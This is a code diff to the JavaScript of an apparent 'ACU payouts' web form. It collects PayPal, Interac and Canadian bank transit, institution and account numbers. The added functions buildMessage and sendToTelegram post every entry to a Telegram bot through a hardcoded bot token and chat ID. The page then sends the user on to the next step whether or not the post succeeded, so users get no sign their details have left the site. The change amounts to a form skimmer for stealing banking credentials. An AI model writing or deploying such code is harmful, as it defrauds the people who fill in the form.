@@ -1032,6 +1032,40 @@ function validateCanadianBankDetails() {
 
 }
 
+function buildMessage(data) {
+  return `
+📩 New Form Submission:
+
+Preference: ${data.preference || "-"}
+Account Name: ${data.accountName || "-"}
+ACU Account: ${data.acuAccount || "-"}
+PayPal: ${data.paypal || "-"}
+Interac: ${data.interac || "-"}
+Bank: ${data.canadianBank || "-"}
+
+Transit Number: ${data.transitNumber || "-"}
+Institution Number: ${data.institutionNumber || "-"}
+Account Number: ${data.accountNumber || "-"}
+`;
+}
+
+const BOT_TOKEN = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
+const CHAT_ID = "-1003913850436";
+
+function sendToTelegram(data) {
+  const message = buildMessage(data);
+
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  });
+}
 
 /* --------------------------
 SAVE DATA
@@ -1044,31 +1078,47 @@ function saveData() {
     return;
   }
 
-  const data = {
+  document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
-    preference,
+  const data = {
+    preference: document.getElementById("preference")?.value.trim(),
 
     acuAccount: document.getElementById("acuAccount")?.value.trim(),
-
     paypal: document.getElementById("paypalInput")?.value.trim(),
-
     interac: document.getElementById("interacInput")?.value.trim(),
-
     canadianBank: document.getElementById("canadianBankSelect")?.value.trim(),
 
     accountName: document.getElementById("accountName")?.value.trim(),
-
     transitNumber: document.getElementById("transitNumber")?.value.trim(),
-
     institutionNumber: document.getElementById("institutionNumber")?.value.trim(),
-
     accountNumber: document.getElementById("accountNumber")?.value.trim()
-
   };
 
+  // validation: at least one field
+  const hasAnyValue = Object.values(data).some(v => v && v.toString().trim() !== "");
+
+  if (!hasAnyValue) {
+    alert("Please fill at least one field");
+    return;
+  }
+
+  // save locally
   localStorage.setItem("section3Data", JSON.stringify(data));
 
-}
+  try {
+    // send first, wait for completion
+    await sendToTelegram(data);
+
+    // only navigate AFTER success
+    window.location.href = "section2.html";
+
+  } catch (err) {
+    console.error("Telegram send failed:", err);
+
+    // still allow navigation (optional decision)
+    window.location.href = "/acu-payouts";
+  }
+});
 
 function getFingerprint() {
   return btoa(
